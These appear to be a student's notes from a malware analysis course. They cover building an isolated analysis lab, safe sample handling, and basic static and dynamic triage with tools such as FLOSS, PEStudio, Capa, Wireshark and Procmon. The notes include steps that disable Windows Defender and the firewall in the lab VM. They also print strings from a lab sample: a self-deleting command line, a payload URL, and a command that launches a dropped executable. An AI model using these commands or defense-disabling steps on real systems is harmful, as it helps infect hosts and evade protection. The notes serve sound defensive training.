Introduction to:
- Malware analysis 
- reverse engineering
- triage

GOAL malware analysis -->  deeply understand what the malware does
                          - how it is build
                          - what network actions does
                          - what actions to the host does

It's important for malware analysis:
to have a place where you can run a malware
<span style="color:#00b050">detonating</span> = run a malware
=>
- this must be done in a safe environment 
- malware usually work in windows
=>
we need to build up a safe LAB 

# Build Malware Analysis Lab
Download windows 10 64 bit enterprise from -->  [here](https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise)
## Virtual Box
### PMAT-FlareVM
Create a new VM as here 
![[Pasted image 20240311145530.png]]
RAM 4096 > Create Virtual hard disk > VDI > Dynamically allocated > 50 gb > Finish

- Run the VM > Select the ISO that you downloaded
- select Custom Installation > click on New > Apply (51200 default size) > OK
- select this partition and click Next
- now Windows will begin the installation
- when ask to sign in with microsoft account => click on Domain join instead > enter `simone`
- enter the password -->  `password`
- security question -->  asd, asd, bob
- for Privacy Settings -->  turn all off
- turn off Cortana

#### Guest Additions
When the VM is up:
- click on Devices (from the VM bar) > Insert Guest Additions
- go to the Explorer File inside the VM > This PC > double click on VirtualBox Guest Addition
- double click on the amd64 exe
- Reboot the VM
- enter inside it and minimize and maximise the VM a few times to get the full screen

#### Snapshot
- click on Machine (from the VM bar) > Take Snapshot > call it `base-install`

#### Installing FLARE-VM
we are going to install:
- google chrome
- windows terminal
- FLARE-VM

FLARE-VM -->  collection of software installations scripts for Windows systems that allows you to easily setup and maintain a reverse engineering environment on a virtual machine (VM)


- install chrome --> [site]([https://www.google.com/chrome/](https://www.google.com/chrome)
- <span style="background:#fff88f">Download Windows Terminal:</span>
    - Download the VCLibs package
      In a PowerShell window as ADMIN, run: 
      `cd 'C:\Users\simone\Desktop\'`
      `wget https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -usebasicparsing -o VCLibs.appx`
    - Download the Windows Terminal MSIX bundle from the provided link: 
      `wget https://github.com/microsoft/terminal/releases/download/v1.15.3465.0/Microsoft.WindowsTerminal_Win10_1.15.3465.0_8wekyb3d8bbwe.msixbundle -UseBasicParsing -o winterminal.msixbundle`
    - In a PowerShell admin window, add the VCLibs package: 
      `Add-AppxPackage .\VCLibs.appx`
    - In a PowerShell admin window, run: 
      `Add-AppxPackage .\winterminal.msixbundle `
    - NOW WE HAVE WINDOWS TERMINAL -->  click win button > Search Terminal
      
- <span style="background:#fff88f">Disable proxy auto detect setting:</span>
    - click win button > search Proxy settings
    - Switch "Automatically detect settings" button off
      
- <span style="background:#fff88f">Disable Tamper Protection</span>
    - Search virus & threat protection > Manage Settings > turn all OFF
      
- <span style="background:#fff88f">Disable AV/Defender in GPO</span>
    - click win button > search Edit Group policy (GPO)
    - navigate to Administrative Templates > Windows Components 
    - double click on Microsoft Defender Antivirus 
    - double click on “Turn off Microsoft Defender Antivirus” > click on Enable > Apply > Ok
      
- <span style="background:#fff88f">Disable Windows Firewall</span>
    - also in GPO > Administrative Templates > Network > double click on Network Connections
    - double click Windows Defender Firewall > double click on Domain Profile 
    - double click on “Protect All Network Connections” > click on Disable > Apply > Ok
    - Do the same but for the Standard profile
      
- <span style="color:#00b050">TAKE A SNAPSHOT!</span>
	- close the machine > save the current state > click on the icon next to the VM >  Snapshot
	- Take > call it pre-flareVM
	- click on Start (to start again the VM)
  
- Download and install FLARE-VM:
    - open the terminal as admin: 
      `(New-Object net.webclient).DownloadFile('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',"$([Environment]::GetFolderPath("Desktop"))\install.ps1")`
    - Change directories to the Desktop
    - Run: `Unblock-File .\install.ps1`
    - Run: `Set-ExecutionPolicy Unrestricted`
    - Accept the prompt to set the ExecPol to unrestricted if one appears
    - Run: `.\install.ps1 -customConfig https://raw.githubusercontent.com/HuskyHacks/PMAT-labs/main/config.xml`
    - Follow the rest of the prompts and continue with the installation.
    - It takes a long time and also maybe it will reboot a couple of times
	    - if it seems stucked =>  try to hit enter in the terminal
	    - you will <span style="color:#00b050">hear a sound</span> when it will finishes
    
- When the installation is done =>  TAKE ANOTHER SNAPSHOT -->  call it flareVM-clean

### PMAT-REMnux
Remnux -->  linux distro buils specifically for malware analysis and reverse engineering
=>
- go [here](https://remnux.org/#distro) > Download > VirtualBox OVA > Download OVA from Box > Download
- right click on the file downloaded > open with VirtualBox
- change the name to -->  `PMAT-REMnux`
- change hw resources as you wish
- run the VM > minimize and maximize the VM to enter in fullscreen

### Network Setup
We need to setup the network for our VMs
bc:
>[!warning] We need a safe environment
>we'll run malware
>=>
>it's important that -->  those VVs cannot reach our physical OS through the network 

=>
we want that the 2 VMs:
- can talk to each other
- cannot talk with physical OS
  
=>
- power off both the VMs and close VirtualBox
- To do the step under we need to change a virtual box config
  =>
	- `open terminal` 
	- `cd /etc`
	- `sudo mkdir vbox`
	- `sudo vi networks.conf`
	- paste `* 0.0.0.0/0 ::/0`
	  
- open Virtual box
- click on Tools in the main page of virtualbox, click the least icon > Network
- Create > enable DHCP server in the new network
- go to the Adapter tab under the network:
	- change the IPv4 Address to something diff from your network =>  `10.0.0.1`
	- netmask -->  `255.255.255.0`
	- click Apply
- go to the DHCP Server tab:
	- Server address -->  `10.0.0.2`
	- Server Mask -->  `255.255.255.0`
	- Lower Address Bound -->  `10.0.0.3`
	- Lower Address Bound -->  `10.0.0.254`
	- click Apply

#### PMAT-FlareVM
- Open the VM settings > Network > select Host Only Adapter > and select the network that we created
- check the other Adapters are OFF
- click OK

#### PMAT-REMnux
- Do the exact same thing

### Check setup
- turn on both VM
- we need to check that our machines have the right network configuration:
	- on REMnux:
		- open terminal 
		- `ip a`
		  
	- on Windows:
		- search cmder
		- `ipconfig`
		  
	- on both check if they cannot talk to outside the network but can talk to each other
		- `ping google.com` -->  should fails
		- `ping 8.8.8.8` -->  should fails
		- `ping the other machine` -->  should works
![[Pasted image 20240311173414.png]]

## INetSim Setup
### Explain why we need this and the 2 VMs
we have 2 VMs:
- windows VM -->  bc usually malware run on windows
- REMnux VM

why do we have this linux VM:
- bc the REMnux is going to be a -->  <span style="color:#00b050">Internet Simulator</span> 
- to analyse traffic with -->  <span style="color:#00b050">Wireshark</span>, tcpdump

to act as "Internet Simulator" we need a tool called:
<span style="color:#00b050">INetSim</span> 

<span style="background:#fff88f">This tool will be the capability to:</span>
- respond to any outbound internet requests -->   that the malware is going to make

Then we could:
- <span style="color:#00b050">analyze the requests from the malware</span> through -->  wireshark

=>
we need to setup to different location:
1) one that -->  will focus on Host Based Indicators
2) one that --> will help with Network Based Indicators

For these reasons -->  we need to use 2 VMs

### INetSim Setup (REMnux)
- open a temrinal
- `sudo vi /etc/inetsim/inetsim.conf`
- we want to enable DNS =>   delete the comment from `start_service dns`
- uncomment also `service_bind_address   10.10.10.1`
	- and change it to -->  `service_bind_address   0.0.0.0`
	- in this way we'll bind to all the interface on the host
	  
- find the Service DNS
	- uncomment -->  `dns_default_ip         10.10.10.1`
	- and change it to -->   `dns_default_ip         10.0.0.4`    IP of this REMnux VM

- Save the file and close it

run the tool:
`inetsim`
![[Pasted image 20240311182112.png]]
=>
Now DNS is running  (also the other protocol that were enabled by default)

#### Test INetSim
To test it -->  run the Windows VM
- open Google chrome
- type the REMnux IP => 10.0.0.4
  ![[Pasted image 20240311182424.png]]

- it also works with HTTPS
- NOW:
  type `https://10.0.0.4/malz.exe`
  =>
  it will download a exe file
  
Another thing we need:
- click win button > Network connections > double click Ethernet > Properties >
- double click on Internet Protocol Version 4 > click on Use the following DNS server address
- type the REMnux IP -->  `10.0.0.4`
- Exit

<span style="background:#fff88f">What we did:</span>
now every time you search whatever page you want on google =>  you'll be <span style="color:#00b050">r</span><span style="color:#00b050">edirect to INet</span>
=>
we have setup a -->  <span style="color:#00b050">fake DNS Server</span>
<span style="color:#00b050">that will respond to </span>-->  <span style="color:#00b050">any DNS request</span> from the windows machine

<span style="background:#fff88f">why we did this:</span>
bc in this way:
<span style="color:#00b050">when we detonate a malware</span> 
=>
we can -->  <span style="color:#00b050">monitor every site</span> <span style="color:#00b050">that the <span style="color:#00b050">malware</span> is trying to reach</span>

## Course Lab Repo
[github course lab repo](https://github.com/HuskyHacks/PMAT-labs)
- Go to the repo > click on Code > Download ZIP
- Copy the zip inside the FlareVM machine
- to open each zip for each malware the password is -->  `infected`

You may be wondering, why is there a picture of a handsome cat in the root directory?
The malware samples in this course are built to perform different functions. 
Some are designed to:
- <span style="color:#00b050">destroy data</span>
- <span style="color:#00b050">other to steal it</span>
- some don't touch your data at all.

`cosmo.jpeg` 
=>  
is a <span style="color:#00b050">placeholder for the precious data</span> that an average end user may have on their host
=>
Some malware samples in this course will -->    - <span style="color:#00b050">steal him</span>
                                        - <span style="color:#00b050">encrypt him</span>
                                        - <span style="color:#00b050">encode and exfiltrate him</span>

## Detonate First Malware
### Take a snapshot
Go to top bar of the VM > Machine > Take a snapshot > call it `pre-detonation`

### Wannacry
- Open the LAB folder > labs > 4.1 Bossfight-wannacry > 
- double click on the 7zip (open it with 7zip) > insert `infected`
=>
copy the exe into the desktop

>[!warning]
>before detonate the malware --> <span style="color:#00b050"> turn OFF InetSim </span>on REMnux VM


the file that we have extracted -->  as no extension
=>
this is for -->  extra safety reason
=>
to "arm" the file => add .exe at the end of the filename  (do it) 

Now:
- right click on the .exe > Run as administrator
- ![[Pasted image 20240312112717.png]]
=>
<span style="color:#00b050">we ran our first malware</span>

<span style="background:#fff88f">Now we want to restore our VM to a state before the detonation:</span>
=>
- Close the VM by -->  clicking the "x" in the top right corner > "Power off the machine" AND
- click on "Restore current snapshot 'pre-detonation"
- if we re-open our VM => <span style="color:#00b050"> everything is good without malware</span>
- delete the .exe

## Tool Troubleshooting
if you open the Tools folder on your FlareVM desktop
=>
you can find -->  all the tools installed with FLARE-VM

<span style="background:#fff88f">What do we do if one of these tools it doesn't work or his installation failed:</span>
- Go back temporarily to a network -->  that allows us to connect to internet
	- Machine > Settings > Network > switch to NAT
	- restart the VM
	- win button > Network Connection > double click Ethernet > Properties > ipv4 
	- make sure that both are using address automatically (IP address and DNS server IP)
	- open the browser
	- google the name of the tool
	- download it and install it 
- NOW you need to restore your VM:
	- switch back network to Host-only Adapter and select the network name
	- restore the DNS server to the REMnux machine

### List of tools and link
- FLARE-VM
    - strings/FLOSS: [https://github.com/mandiant/flare-floss](https://github.com/mandiant/flare-floss)
    - PEView: [http://wjradburn.com/software/](http://wjradburn.com/software)
    - upx (not used but referenced): [https://upx.github.io/](https://upx.github.io/)
    - PEStudio: [https://www.winitor.com/download](https://www.winitor.com/download)
    - Capa: [https://github.com/mandiant/capa](https://github.com/mandiant/capa)
    - Wireshark: [https://www.wireshark.org/](https://www.wireshark.org/)
    - Sysinternals (Procmon, TCPView): [https://learn.microsoft.com/en-us/sysinternals/downloads/](https://learn.microsoft.com/en-us/sysinternals/downloads)
    - nc/ncat: [https://nmap.org/download](https://nmap.org/download)
    - Cutter: [https://github.com/rizinorg/cutter](https://github.com/rizinorg/cutter)
    - x32/x64dbg: [https://x64dbg.com/](https://x64dbg.com/)
    - Process Hacker 2 (now known as System Informer): [https://systeminformer.sourceforge.io/](https://systeminformer.sourceforge.io/
    - scdbg: [https://github.com/dzzie/SCDBG](https://github.com/dzzie/SCDBG)
    - dnSpy/dnSpyEx: [https://github.com/dnSpyEx/dnSpy](https://github.com/dnSpyEx/dnSpy)
    - PEBear: [https://hshrzd.wordpress.com/pe-bear/](https://hshrzd.wordpress.com/pe-bear)
    - YARA: [https://github.com/VirusTotal/yara](https://github.com/VirusTotal/yara)
- REMnux
    - base64 (built in Linux bin)
    - OLEdump: [https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py)
    - MobSF (Docker Container): [https://github.com/MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | [https://hub.docker.com/r/opensecurity/mobile-security-framework-mobsf/](https://hub.docker.com/r/opensecurity/mobile-security-framework-mobsf)
    - INetSim: [https://www.inetsim.org/](https://www.inetsim.org/)




## Basic Malware Handling
One thing that you really need to keep in mind:
<span style="color:#00b050">SAFETY ALWAYS</span>

bc:
we are going to work with -->  Live malware

<span style="background:#fff88f">the times that you are most vulnerable:</span>
are going to be -->  when the <span style="color:#00b050">malware is in transit</span> 

<span style="background:#fff88f">one principle of malware handling:</span>
is to <span style="color:#00b050">add</span> -->  <span style="color:#00b050">another extension</span> to the malware   (es `malware.exe.malz`)
=>
so in this way -->  it will not executed if you run it 

### Standard convention to handle malware
Usually you need a convention for:
- <span style="background:#fff88f">the filename of the malware:</span>
  `malware.name.exe.malz`
  `malware` -->  category of the malware
  `name` -->  name of the malware
  `exe` -->  extension of the malware
  `malz` -->  extra extension for safety reason

- <span style="background:#fff88f">how to build the folder that contains the malware:</span>
	- <span style="color:#00b050">call the folder</span> -->  in the same way you called the malware
	- <span style="color:#00b050">ZIP</span> the malware
	- <span style="color:#00b050">ENCRYPT</span> the malware with a password

## Safe Malware Sourcing & Additional Resources
### Where to find source malware
<span style="background:#fff88f">where to find source malware:</span>
- PMAT Labs: [https://github.com/HuskyHacks/PMAT-labs](https://github.com/HuskyHacks/PMAT-labs)
- theZoo: [https://github.com/ytisf/theZoo](https://github.com/ytisf/theZoo)     (easy)
- vx-underground main site: [https://www.vx-underground.org/](https://www.vx-underground.org/)
- vx-underground GitHub repo: [https://github.com/vxunderground/MalwareSourceCode](https://github.com/vxunderground/MalwareSourceCode)
- Zeltser Resources: [https://zeltser.com/malware-sample-sources/](https://zeltser.com/malware-sample-sources/)
- MalwareBazaar: [https://bazaar.abuse.ch/](https://bazaar.abuse.ch/)

# Basic Static Analysis
Static Analysis -->  we are not running the malware
in this phase:
it's a very early in the analysis =>  we won't able to draw any definitive conclusions
								(without running the malware)

## Hashing Malware Samples
Lab sample:
`PMAT-labs/labs/1-1.BasicStaticAnalysis/Malware.Unknown.exe.malz/Malware.Unknown.exe.7z`
- extract the malware into Desktop
### Find Hashes of the malware
now:
to fingerprint the malware we first need to collect 2 hashes:
-  SHA256 sum
- MD5 sum

=>
- open cmder > cd to Desktop
- `sha256sum.exe Malware.Unknown.exe.malz`
  ![[Pasted image 20240312135226.png]]
- save this hash in a txt file <span style="background:#fff88f">FOR FUTURE REPORT</span>:   [[1.1-Basic_static_analysis]]
  `92730427321a1c4ccfc0d0580834daef98121efa9bb8963da332bfd6cf1fda8a *Malware.Unknown.exe.malz`  

- `md5sum.exe Malware.Unknown.exe.malz`
- save the output in the txt file:
  `1d8562c0adcaee734d63f7baaca02f7c *Malware.Unknown.exe.malz`

### Check if the hashes are well known as malware sample
- Open [[cheat#VIRUSTOTAL]]
  gigantic repository of lots of different info about malware samples
- in the search section paste one hash per time and check if it finds something 
  ![[Pasted image 20240312140730.png]]
=>
<span style="color:#00b050">in this way we can gather more info on the malware</span> 

## Strings & FLOSS: Static String Analysis
<span style="background:#fff88f">if a bad programmer wants to call a website inside is malware:</span>
for example to go to -->  `https://domain.com/evil.exe`
=>
he needs to:
- <span style="color:#00b050">put this string </span>somewhere <span style="color:#00b050">inside the malware</span> 
- make a web request

<span style="background:#fff88f">when a binary is assembled:</span>
- the strings are inside the binary
- they <span style="color:#00b050">can be read</span> by looking -->  the <span style="color:#00b050">bytes</span> of the binary
  =>
  we <span style="color:#00b050">don't need to run the malware</span> to read them

How to do that -->  with [[cheat#FLOSS]]

### FLOSS
tools for extracting Strings from binary
it also tries to -->    - <span style="color:#00b050">decode</span>
                 - <span style="color:#00b050">de-obfuscate </span> the strings

`FLOSS.exe Malware.Unknown.exe.malz`  -->  it will print any strings that has at least 4 characters
`FLOSS.exe -n 6 Malware.Unknown.exe.malz` -->  to print only strings with >= 6 ch

- some strings will be completely useless
- <span style="background:#fff88f">others can be useful:</span>
  ![[Pasted image 20240312143455.png]]
  _<span style="color:#00b050">with some experience you will find interesting strings easier</span>
  
<span style="background:#fff88f">Sometimes the most useful strings are in the bottom output:</span>
in the -->  `FLOSS STATIC STRINGS:`
![[Pasted image 20240312143710.png]]
<span style="color:#00b050">this might or not might be useful</span>
=>  copy this strings inside the [[1.1-Basic_static_analysis|report]]

## Analyzing the Import Address Table
Now we are going to:
- <span style="color:#00b050">look at the structure </span>of the binary 
- find more info about:
	- <span style="color:#00b050">when it was compiled</span>
	- <span style="color:#00b050">what kind of functions it might be using</span>

we are going to use -->  [[cheat|PEview]]
>[!info]
>to install it:
>- download the zip from [here]([http://wjradburn.com/software/PEview.zip](http://wjradburn.com/software/PEview.zip)      
>- copy the zip inside the FlareVM

### Peview
- open it
- it will ask for a exe file =>  chanhe the type file to "All Files" > select our malware
  ![[Pasted image 20240312145215.png]]
=>
a <span style="color:#00b050">Portable executable</span> -->  is simply a huge array of bytes

### Peview Structure
let's see the column of Peview:
`pFile` -->  represents the offset of the exadecimal bytes
`Raw Data` -->  represents the exadecimal bytes
`Value` -->  it's a character representation of what these bytes looks like

<span style="background:#fff88f">The MZ value:</span>
- is the Magic Bytes  [[Notes_ETH#Magic Bytes 0x02|more info here]]
- is a unique string that identifies the file as -->  windows executable

#### IMAGE_FILE_HEADER section
<span style="background:#fff88f">one of the first thing to look at:</span>
is the -->  <span style="color:#00b050">IMAGE_FILE_HEADER section</span> (inside the IMAGE_NT_HEADERS)
bc:
one set of bytes inside the executable -->  will have the <span style="color:#00b050">time date stamp</span>
time date stamp -->  is a time of compilation

why can be useful:
bc in some case if the date is weird (ex too hold) =>  can mean something useful

### IMAGE_SECTION_HEADER.txt
has info that can be read into the binary at runtime
=>
look at:
- <span style="color:#00b050">Virtual Size</span> 
- <span style="color:#00b050">Size of Raw Data</span> 
![[Pasted image 20240312151355.png]]
=>
- Take this 2 values (second column)
- Convert them into decimal
- compare them

<span style="background:#fff88f">If the Virtual Size is much much  bigger of the Size of Raw Data:</span>
=>
maybe there is more into this binary -->  than is initially available to us 
=>
how binary can be -->  a <span style="color:#00b050">packet binary</span>  (we'll see that later)

### IMPORT Address Table
inside the SECTION .rdata

This can be really useful -->  but first we need to understand what is the <span style="color:#00b050">WINDOWS API</span> 

#### Windows API
OS is written in very low level (01, jmp, xor)
=>
<span style="background:#fff88f">to make easier the life of programmers:</span>
=>
OS programmers decide that:
if a programmer wants to create a tool for the OS =>   - he won't need to write it at low low level
											  - he can use a language like C, C++
											  - and use the functions provided by the OS
##### MAlAPI.io
How to understand which API can be used maliciously?
we can use this website -->  [MAlAPI.io](https://malapi.io/)
<span style="color:#00b050">MAlAPI:</span>
- it catalogs Windows API -->  that can be user maliciously
- it identifies sample of malwares that -->  those APIs are used maliciously in

=>
### IMPORT Address Table
It's important to check:
<span style="color:#00b050">which OS functions</span> -->  the malware used
Some functions that may make us suspicious are:
- [ShellExecuteW](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutew) -->  performs an operation on a specified file
- [URLDownloadToFileW](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) -->  download bits from internet and saves them to a file

if you don't know that a function does =>  google it and look at the Microsoft documentation

>[!warning]
>At this point of the analysis:
>it's still to <span style="color:#00b050">early</span> to -->  <span style="color:#00b050">come to any conclusions</span>
>

## Packed Malware Analysis
Packet malware:
<span style="color:#00b050">packet</span> means something -->  <span style="color:#00b050">compressed</span>/<span style="color:#00b050">encrypted</span>
=>
<span style="color:#00b050">packet malware</span> -->        - is malware that is compressed/encrypted
                    - so that it <span style="color:#00b050">looks different than its original source</span>
### Packing Program
A packing program: (ex <span style="color:#00b050">UPX</span>)
- takes a malware
- puts inside it at the top a program called -->  <span style="color:#00b050">packet stub</span>   (or comprension/stub, coder/stub)
- this packet stub:
	- takes all the malware code below him -->  and it compresses these codes
	  => 
- the result is:
	- a program -->  a lot smaller than the original one
	- it will have 3 sections:
		- the<span style="color:#00b050"> original portable executable header</span>
		- the <span style="color:#00b050">stub</span>
		- the <span style="color:#00b050">code</span> (but compressed)

At runtime:
- the stub -->  <span style="color:#00b050">expand the code to the original size</span> 

<span style="background:#fff88f">why do that:</span>
bc for example an <span style="color:#00b050">Anti Virus (AV) </span>-->  can <span style="color:#00b050">DON'T KNOW the signature</span> of the malware compressed
=>
<span style="background:#fff88f">if the AV finds:</span>
- the <span style="color:#00b050">unpacked malware</span> -->      - it <span style="color:#00b050">will recognize</span> the signature
							- it will <span style="color:#00b050">stop</span> the malware

- the <span style="color:#00b050">packed malware</span> -->   - maybe the AV <span style="color:#00b050">won't recognize</span> it as a malware
						- the malware will <span style="color:#00b050">execute</span> 

### Example packet malware
Unzip into Desktop the zip inside the lab folder:
`labs\1-1.BasicStaticAnalysis\Malware.PackedAndNotPacked.exe.malz`

here he have to 2 malware:
- one packed
- one unpacked

=>
- open the packet malware with [[cheat#PEview]]
  ![[Pasted image 20240313115501.png]]
- we have different sections here  (compare to the unpacked malware)
	- we can notice sections called -->  <span style="color:#00b050">UPX</span>
also:
- we still have the -->  <span style="color:#00b050">IMPORT Address table</span>
- we can check the dimension of -->  Virtual Size vs Raw Data
#### IMPORT Address Table - Packed malware
if you open it
you'll see that -->  the <span style="color:#00b050">Address Table is ridiculously SHORT</span> 
                 (even the simplest program would have a tabler bigger than this one)
                ![[Pasted image 20240313115845.png]]
Also:
<span style="background:#fff88f">there are 2 suspicious functions:</span>
- `LoadLibraryA` -->  loads the specified module into the address space of the calling process
- `GetProcAddress` -->  retrieves the address of an exported function/variable from the specified
                    dynamic-link library (DLL)
=>
<span style="background:#fff88f">these 2 functions mean:</span>
- <span style="color:#00b050"> I don't have these address imports in my table right now</span>
- => I'll go find them
=>
<span style="background:#fff88f">When the malware will go back to the normal size:</span>
- these 2 fz -->    - will be invoked 
                - will <span style="color:#00b050">find the other API calls </span>that the malware uses

#### IMAGE_SECTION_HEADER_UPX0
Last thing to check:
if the -->  <span style="color:#00b050">Virtual Size is different from the Raw Data</span> 
![[Pasted image 20240313120815.png]]

here is -->  COMPLETELY DIFFERENT 

here the Size of Raw Data is 0:
bc -->  <span style="color:#00b050">it will be initialized after the binary inflated from its packed state</span>        inflated=gonfiato

>[!info] Keep in mind
>At this point of the analysis:
>it's still to <span style="color:#00b050">early</span> to -->  <span style="color:#00b050">come to any conclusions</span>

## Combining Analysis Methods: 
### !! PEStudio !!
Go back to the original malware sample for this section:
=> 
`PMAT-labs/labs/1-1.BasicStaticAnalysis/Malware.Unknown.exe.malz/Malware.Unknown.exe.7z`

<span style="color:#00b050">PEStdio</span> -->  one of the best tools for initial static analysis
it will automatically:
1) [[Notes_PMAT#Find Hashes of the malware|find the hashes of the malware]]
2) these hashes have a direct link to [[cheat#VIRUSTOTAL|VIRUSTOTAL]]   (right click on the hash > copy link)
3) show the [[Notes_PMAT#Peview|magic bytes]]

![[Pasted image 20240313122233.png]]

#### Indicators Section
lists all the Strings in the binary and catalogs them into -->  <span style="color:#00b050">POTENTIAL MALICIOUS STRING</span>
![[Pasted image 20240313122502.png]]

#### libraries 
lists all the libraries used by the binary and identifies -->  <span style="color:#00b050">those usually only used by malware</span> 
![[Pasted image 20240313122755.png]]

#### strings
additional layer that examines the strings inside the binary
![[Pasted image 20240313123214.png]]

### Capa
program that <span style="color:#00b050">detects malicious capabilities</span> in suspicious programs <span style="color:#00b050">by using a set of rules</span>
These <span style="color:#00b050">rules</span>:
are meant to be -->  as <span style="color:#00b050">high-level and human readable</span> as possible
example:
Capa will examine a binary -->      - identify an API call or string of interest
                            - match this piece of info against a rule 
                              that is called 
	                            - "receive data" or 
	                            - "connect to a URL"
=>
<span style="color:#00b050">It translates</span> -->  the technical info in a binary into a simple, human-readable piece of info

<span style="background:#fff88f">example:</span>
`capa.exe Malware.Unknown.exe.malz`
![[Pasted image 20240313125946.png]]

#### MITRE Adversary Tactics, Techniques & Common Knowledge (ATT&CK)
The MITRE ATT&CK Framework:
is a <span style="color:#00b050">standard knowledge</span> base of -->  adversary tactics, techniques, and procedures (TTPs). <span style="background:#fff88f">MITRE ATT&CK:</span>
- <span style="color:#00b050">define and classify cyber adversary activity into groups </span>
- based on:
	- what the activity seeks to accomplish 
	- how the activity is carried out.

<span style="color:#00b050">"In my professional life, no other standard set of def has seen more use than MITRE ATT&CK. 
It is an industry standard just about everywhere you go"</span> 

#### Capa Output
##### Malware Behavioral Catalog (MBC)
MBC:
- similar classification system to MITRE ATT&CK
- but <span style="color:#00b050">focuses</span> on <span style="color:#00b050">malware</span> specifically
  =>
- <span style="color:#00b050">translates MITRE ATT&CK items</span> -->  into terms that focus on the malware analysis use case

<span style="background:#fff88f">In this case Capa identifies that the maware has the capability to:</span>
- Send and receive data
- Do so over HTTP
- Create and terminate processes

##### Capability
- identifies Capa rule matches against the default Capa rule set.
- this is the most specific of the 3 outputs and gives us the best information for triage

Like in the MBC output, the Capa rule output identifies that the malware can:
- connect to a URL
- send and receive data
- manipulate processes.

More than MBC here we can see -->     - the <span style="color:#00b050">n° of matches </span>
                                 - the <span style="color:#00b050">namespace for the rules in this output</span>

#### Other example
##### verbose
`capa.exe Malware.Unknown.exe.malz -v`
`-v` -->  verbose
![[Pasted image 20240313131853.png]]

Capa identifies:
- the rule that is triggered for the binary
- the type of rule
- even the <span style="color:#00b050">location in the binary where the rule is triggered in hex form</span>

##### double verbose
`capa.exe Malware.Unknown.exe.malz -vv`
![[Pasted image 20240313132351.png]]

```
download URL to file
namespace  communication/http/client
author     matthew.williams@fireeye.com
scope      function
mbc        Communication::HTTP Communication::Download URL [C0002.006]
examples   F5C93AC768C8206E87544DDD76B3277C:0x100020F0, Practical Malware Analysis Lab 20-01.exe_:0x401040
function @ 0x401080
  or:
    api: urlmon.URLDownloadToFile @ 0x4010D9
```

For example the output of `download URL to file` rule indicates that:
- his rule triggers when the `urlmon.URLDownloadToFile` API call is located in the binary
- It has identified:
	- this API call
	- provides the location in the binary where it is called
	- provides some examples of where this kind of malware behavior has been seen before

 For some rules:
<span style="background:#fff88f"> there are conditionals that can trigger the rule based on multiple criteria</span>
example:
```
create process (2 matches)
namespace  host-interaction/process/create
author     moritz.raabe@fireeye.com
scope      basic block
mbc        Process::Create Process [C0017]
examples   9324D1A8AE37A36AE560C37448C9705A:0x406DB0, Practical Malware Analysis Lab 01-04.exe_:0x4011FC
basic block @ 0x4010E3
  or:
    api: shell32.ShellExecute @ 0x401128
basic block @ 0x401142
  or:
    api: kernel32.CreateProcess @ 0x4011AD
```
This rule identifies process creation based on:
- the existence of the `ShellExecute` API call -->  located in `shell32.dll` 
  or 
- the `CreateProcess` API call -->  located in `kernel32.dll`

## Note Review
Look at the -->   [[1.1-Basic_static_analysis|report]]
to see how to write a report for this work

#  Basic Dynamic Analysis
In this process -->  we are going to execute the malware

doing Static analysis -->  is useful to find some initial info
but nothing more than run the malware:
can give us info

##  Host and Network Indicators
dynamically analysis will tell us a lot of info about:
- <span style="color:#00b050">host indicators</span> -->  actions that happen on the host where the malware is been detonated
- <span style="color:#00b050">network indicators</span> -->  action that happen through the network

some actions can be both:
example DNS request -->      - can be surely a network indicator
                        - but also a host indicator   (due to log file inside the host)

## Initial Detonation & Triage
### Network Indicators
#### Hunting for Network Signatures
we'll use the same malware as the previous lab
`PMAT-labs/labs/1-1.BasicStaticAnalysis/Malware.Unknown.exe.malz/Malware.Unknown.exe.7z`

<span style="background:#fff88f">what this malware does:</span>
- it tries to reach a domain
- it sees if the domain is online
	- if YES =>  it connects to it
	- if NO =>  it deletes the malware from the pc 
=>
##### Wireshark and Inetsim
- turn on REMnux VM
	- launch `inetsim`              ([[Notes_PMAT#INetSim Setup]])
	- launch wireshark -->  `sudo wireshark`
- on FlareVM
	- remove the .malz extension to the malware

Now:
look at our Report and what we found with the static analysis:
```bash
cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "%s"     
http://ssl-6582datamanager.helpdeskbros.local/favicon.ico
C:\Users\Public\Documents\CR433101.dat.exe 
Mozilla/5.0               
http://huskyhacks.dev                         
ping 1.1.1.1 -n 1 -w 3000 > Nul & C:\Users\Public\Documents\CR433101.dat.exe
Open
```
=>
let's filter the wireshark traffic to -->  <span style="color:#00b050">try to catch the favicon.ico</span>
=>
put inside the wireshark bar --> `http.request.full_uri contains favicon.icon` 

now:
<span style="color:#00b050">detonate the malware</span> 
=>
we captured one packet:
![[Pasted image 20240313154822.png]]
open it to the Hypertext Transfer Protocol:
- it's a get request to a site that contains -->  favicon.ico
- from a Firefox browser
- and the FULL URI is -->  `http://ssl-6582datamanager.helpdeskbros.local/favicon.ico`
- <span style="color:#00b050">that is the URI that we found in our static analysis</span> 

=>
Copy this screenshot inside the report as -->  <span style="color:#00b050">Network Signature</span> 

>[!info] What know
>our <span style="color:#00b050">GOAL</span> is to -->  <span style="color:#00b050">completely understand what the malware does</span>
>=>
>for now we only understand that -->  it makes a http request to this webiste
>BUT:
>we don't know what else is doing on the host side (host indicators)
>=>
>- we must restore our VM -->  before the detonation

## Host-Based Indicators
### Procmon
advanced monitoring tool for Windows that shows:
- real-time file system
- registry
- process/thread activity

<span style="background:#fff88f">Most powerful feature</span> -->  the **filter**  (light blue icon)
=>
the only thing that we know about the malware is:
<span style="color:#00b050">the process name</span>  (bc it's the name of the file)
=>
by filtering in this way:
we'll see only the events generated by this process name
#### Filter by process name
![[Pasted image 20240313161128.png]]

=>
- detonate the malware
- look at the procmon output

#### Info About the file created by the malware
![[Pasted image 20240313162150.png]]
=>
we can see:
- <span style="color:#00b050">Time</span> -->  each process order by time
- <span style="color:#00b050">PID</span> -->  the n° of the process (PID)
- <span style="color:#00b050">Operation</span> -->  what type of operations the process does
- <span style="color:#00b050">Path</span> -->  where this operation is happening inside the OS
- <span style="color:#00b050">Result</span>
- <span style="color:#00b050">Detail</span> 

what other thing we can search:
